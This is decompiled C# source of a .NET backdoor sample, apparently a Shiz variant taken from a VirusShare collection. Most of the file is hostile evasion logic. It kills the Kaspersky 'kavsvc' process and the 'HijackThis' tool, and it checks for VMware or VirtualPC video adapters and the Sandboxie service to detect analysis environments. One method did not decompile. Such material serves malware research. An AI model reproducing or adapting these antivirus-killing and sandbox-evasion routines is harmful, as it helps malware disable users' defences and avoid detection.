// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Qstub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=dd0e6adf76ed4a71
// MVID: 45AE1CDB-6F3F-421C-8CA1-13232795BB5F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.Shiz.hprn-62e1204ec8cae7db44d162f50abc095675248dd4a573b819206b95620860dd86.exe

using \u0004;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;

namespace \u0004
{
  internal sealed class \u0002
  {
    private static object \u0001;
    private static string \u0001;
    private static string \u0002 = "SELECT * FROM Win32_VideoController";
    private static RegistryKey \u0001 = \u0080\u0002.\u007E\u0002\u0004((object) Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false);
    private static object \u0002 = \u0093\u0003.\u0081\u0004(\u001C\u0002.\u007E\u0003\u0004((object) \u0002.\u0001, "ProductId"));

    public static void \u0003()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = -2;
label_1:
        int num3 = 2;
        Process[] processes = Process.GetProcesses();
label_2:
        num3 = 3;
        int num4 = checked (processes.Length - 1);
        int index = 0;
        goto label_6;
label_3:
        num3 = 5;
        if (Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase("kavsvc"), false) != 0)
          goto label_5;
label_4:
        num3 = 6;
        processes[index].Kill();
label_5:
        num3 = 8;
        checked { ++index; }
label_6:
        if (index <= num4)
          goto label_3;
        else
          goto label_13;
label_8:
        num1 = num3;
        switch (num2 > -2 ? num2 : 1)
        {
          case 1:
            int num5 = num1 + 1;
            num1 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
              case 5:
                goto label_3;
              case 6:
                goto label_4;
              case 7:
              case 8:
                goto label_5;
              case 9:
                goto label_13;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_8;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_13:
      if (num1 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static bool \u0003()
    {
      int num1;
      int num2;
      bool flag;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 2;
        \u0002.\u0005();
        flag = Operators.CompareString(\u0002.\u0001, "VM Additions S3 Trio32/64", false) == 0;
        goto label_7;
label_1:
        num1 = -1;
        switch (num2)
        {
          case 2:
            ProjectData.EndApp();
            goto label_7;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_1;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num3 = flag ? 1 : 0;
      if (num1 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    public static bool \u0004()
    {
      int num1;
      int num2;
      bool flag;
      while (true)
      {
        try
        {
          ProjectData.ClearProjectError();
          num2 = 2;
          \u0002.\u0005();
          flag = Operators.CompareString(\u0002.\u0001, "VMware SVGA II", false) == 0;
          goto label_7;
label_1:
          num1 = -1;
          switch (num2)
          {
            case 2:
              ProjectData.EndApp();
              continue;
            default:
              goto label_6;
          }
        }
        catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
        {
          ProjectData.SetProjectError(ex);
          goto label_1;
        }
      }
label_6:
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num3 = flag ? 1 : 0;
      if (num1 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    public static bool \u0005()
    {
      int num1;
      bool flag;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        flag = Process.GetProcessesByName("SbieSvc").Length >= 1;
        goto label_7;
label_1:
        num2 = -1;
        switch (num1)
        {
          case 2:
            ProjectData.EndApp();
            goto label_7;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_1;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num3 = flag ? 1 : 0;
      if (num2 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    public static void \u0004()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = -2;
label_1:
        int num3 = 2;
        Process[] processes = Process.GetProcesses();
label_2:
        num3 = 3;
        int num4 = checked (processes.Length - 1);
        int index = 0;
        goto label_7;
label_3:
        num3 = 4;
        string Left = Strings.LCase(processes[index].ProcessName);
label_4:
        num3 = 7;
        if (Operators.CompareString(Left, "HijackThis", false) != 0)
          goto label_6;
label_5:
        num3 = 8;
        processes[index].Kill();
label_6:
        num3 = 12;
        checked { ++index; }
label_7:
        if (index <= num4)
          goto label_3;
        else
          goto label_14;
label_9:
        num1 = num3;
        switch (num2 > -2 ? num2 : 1)
        {
          case 1:
            int num5 = num1 + 1;
            num1 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 9:
              case 10:
              case 11:
              case 12:
                goto label_6;
              case 6:
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 13:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      if (num1 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private static void \u0005()
    {
      // ISSUE: unable to decompile the method.
    }
  }
}
